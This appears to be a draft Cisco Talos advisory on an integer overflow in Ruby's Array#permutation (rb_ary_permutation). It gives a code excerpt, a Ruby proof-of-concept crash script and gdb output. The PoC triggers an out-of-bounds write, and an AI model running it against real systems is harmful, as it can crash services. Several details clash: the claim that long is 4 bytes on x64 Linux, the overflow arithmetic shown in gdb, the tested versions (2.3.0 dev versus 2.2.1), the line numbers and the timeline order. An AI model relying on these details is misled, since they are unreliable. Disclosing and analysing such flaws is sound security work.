Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby Array.permutation "rb_ary_permutation" function integer overflow vulernability.

:: Description

Integer overflow occurs during calculation size of buffer for result of permutation in rb_ary_permutation function of Ruby programming language. 
Properly choosen length of Array for which permutation is done and amount of permutation represent by "r" variable 
can cause integer overflow and in result small size buffer allocation and further out of bound write.
 

:: Tested Versions

Ruby 2.3.0 dev
* Only x64 bits platforms where type "long" is 4 bytes long

:: Product URLs

https://www.ruby-lang.org


:: Details

Code analysis:
------------------------------- code -------------------------------------
4937	static VALUE
4938	rb_ary_permutation(int argc, VALUE *argv, VALUE ary)
4939	{
4940		VALUE num;
4941		long r, n, i;
4942	
4943		n = RARRAY_LEN(ary);                  /* Array length */
4944		RETURN_SIZED_ENUMERATOR(ary, argc, argv, rb_ary_permutation_size);   /* Return enumerator if no block */
4945		rb_scan_args(argc, argv, "01", &num);
4946		r = NIL_P(num) ? n : NUM2LONG(num);   /* Permutation size from argument */
4947	
4948		if (r < 0 || n < r) {
4949			/* no permutations: yield nothing */
4950		}
4951		else if (r == 0) { /* exactly one permutation: the zero-length array */
4952			rb_yield(rb_ary_new2(0));
4953		}
4954		else if (r == 1) { /* this is a special, easy case */
4955			for (i = 0; i < RARRAY_LEN(ary); i++) {
4956				rb_yield(rb_ary_new3(1, RARRAY_AREF(ary, i)));
4957			}
4958		}
4959		else {             /* this is the general case */
4960			volatile VALUE t0;
>4961			long *p = (long*)ALLOCV(t0, r*sizeof(long)+n*sizeof(char));
>4962			char *used = (char*)(p + r);
4963			VALUE ary0 = ary_make_shared_copy(ary); /* private defensive copy of ary */
4964			RBASIC_CLEAR_CLASS(ary0);
4965	
>4966			MEMZERO(used, char, n); /* initialize array */
------------------------------- code -------------------------------------
In Line 4961 allocated is buffer for result of permutation based of calculation Array.length represented by "n" variable and also "r"
number of permutations passed as parameter. Let we take array with size 0x34000001 ("n") and trie to obtain 0x33000000 ("r") permutations.
In that case calculation from line 4961 looks in the following way:
r*sizeof(long)+n*sizeof(char)
0x33000000 * 4  + 0x34000001 = 1
Integer overflow occurs and allocated buffer pointed by "p" variable will have 1* byte size. Later in line 4966 this buffer is initialized with zeros 
and as size is used "n" which is 0x34000001 which cause out of bound write.


:: PoC

Code which triggers this vulnerability
---------------------------------- PoC test.rb ----------------------------------------
puts "Script start"
puts "Creating array..."
a = (1..0x34000001).to_a
puts "Time for permutation"
c = a.permutation(0x33000000){ |x| }
puts "Permutation is read"
puts "End of script"
---------------------------------- PoC test.rb ----------------------------------------


:: Crash analysis

(gdb) r
Starting program: ruby-2.2.1/ruby test.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff7700 (LWP 24707)]
Script start
Creating array...
Time for permutation

Program received signal SIGSEGV, Segmentation fault.
memset () at ../sysdeps/x86_64/memset.S:78
78	../sysdeps/x86_64/memset.S: No such file or directory.
(gdb) bt
#0  memset () at ../sysdeps/x86_64/memset.S:78
#1  0x00005555556e9e67 in rb_ary_permutation (argc=1, argv=0x7ffff7ed3048, ary=93825001507800) at array.c:4898
#2  0x00005555556aa43c in call_cfunc_m1 (func=0x5555556e9bef <rb_ary_permutation>, recv=93825001507800, argc=1, argv=0x7ffff7ed3048) at vm_insnhelper.c:1210
#3  0x00005555556aafe6 in vm_call_cfunc_with_frame (th=0x555555a1f5f0, reg_cfp=0x7ffff7fd2f70, ci=0x555555e36940) at vm_insnhelper.c:1382
#4  0x00005555556ab13c in vm_call_cfunc (th=0x555555a1f5f0, reg_cfp=0x7ffff7fd2f70, ci=0x555555e36940) at vm_insnhelper.c:1475
#5  0x00005555556abcaf in vm_call_method (th=0x555555a1f5f0, cfp=0x7ffff7fd2f70, ci=0x555555e36940) at vm_insnhelper.c:1691
#6  0x00005555556ac5bf in vm_call_general (th=0x555555a1f5f0, reg_cfp=0x7ffff7fd2f70, ci=0x555555e36940) at vm_insnhelper.c:1846
#7  0x00005555556af8ba in vm_exec_core (th=0x555555a1f5f0, initial=0) at insns.def:1024
#8  0x00005555556c02f5 in vm_exec (th=0x555555a1f5f0) at vm.c:1400
#9  0x00005555556c1479 in rb_iseq_eval_main (iseqval=93825001508840) at vm.c:1670
#10 0x0000555555577bd3 in ruby_exec_internal (n=0x555555e2cfe8) at eval.c:252
#11 0x0000555555577cfc in ruby_exec_node (n=0x555555e2cfe8) at eval.c:317
#12 0x0000555555577ccf in ruby_run_node (n=0x555555e2cfe8) at eval.c:309
#13 0x0000555555575bb2 in main (argc=2, argv=0x7fffffffe628) at main.c:36
(gdb) frame 1
#1  0x00005555556e9e67 in rb_ary_permutation (argc=1, argv=0x7ffff7ed3048, ary=93825001507800) at array.c:4898
4898		MEMZERO(used, char, n); /* initialize array */
(gdb) list
4893		long *p = (long*)ALLOCV(t0, r*sizeof(long)+n*sizeof(char));
4894		char *used = (char*)(p + r);
4895		VALUE ary0 = ary_make_shared_copy(ary); /* private defensive copy of ary */
4896		RBASIC_CLEAR_CLASS(ary0);
4897	
4898		MEMZERO(used, char, n); /* initialize array */
4899	
4900		permute0(n, r, p, used, ary0); /* compute and yield permutations */
4901		ALLOCV_END(t0);
4902		RBASIC_SET_CLASS_RAW(ary0, rb_cArray);
(gdb) p r
$2 = 855638016
(gdb) p n
$3 = 872415233
(gdb) print r*sizeof(long)+n*sizeof(char)
$1 = 1

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-05-08 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure